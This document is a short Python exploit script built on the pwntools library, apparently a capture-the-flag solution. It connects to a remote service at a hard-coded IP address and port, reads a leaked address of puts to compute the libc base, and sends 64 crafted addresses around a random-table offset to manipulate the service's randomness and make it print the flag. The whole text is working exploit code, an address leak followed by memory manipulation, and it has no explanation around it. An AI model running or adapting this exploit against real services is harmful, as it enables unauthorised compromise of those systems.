#!/usr/bin/env python3

from pwn import *

libc = ELF('./libc.so.6')

HOST = '212.193.61.73'
PORT = 1337
r = remote(HOST, PORT)

randtable_offset = 0x3eb1c0

r.sendline(b'4')
r.sendline(b'no')
r.readuntil(b'Nice!\n')
leak = int(r.readline(), 16)
libc_base = leak - libc.symbols['puts']
print(f"puts_leak = {hex(leak)}")
print(f"libc_base = {hex(libc_base)}")

for i in range(64):
    r.sendline(b'2')
    r.sendline(hex(randtable_offset + libc_base + i).encode())

for i in range(10):
    r.sendline(b'1')

r.readuntil(b'[FLAG]:')
flag = r.readline().decode()
print(f'FLAG:{flag}')

